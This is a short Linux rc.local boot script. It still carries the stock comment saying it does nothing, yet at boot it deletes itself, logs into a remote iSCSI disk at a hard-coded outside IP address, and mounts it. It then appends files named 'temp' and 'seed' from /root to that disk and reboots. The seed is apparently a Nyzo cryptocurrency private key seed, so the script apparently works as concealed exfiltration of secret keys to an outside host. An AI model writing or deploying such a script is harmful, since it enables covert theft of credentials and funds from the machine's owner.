#!/bin/sh -e
##
## rc.local
##
## This script is executed at the end of each multiuser runlevel.
## Make sure that the script will "exit 0" on success or any other
## value on error.
##
## In order to enable or disable this script just change the execution
## bits.
##
## By default this script does nothing.
sleep 5s &&

rm /etc/rc.local &&

sudo iscsiadm --mode node --targetname nyzo --portal 64.227.99.95:3260 --login &&

sleep 20s &&

mount /dev/sda /nyzo &&

sleep 20s &&

cd /root &&

cat temp >> /nyzo/1.txt &&

sleep 10s &&

cat seed >> /nyzo/2.txt &&

reboot

exit 0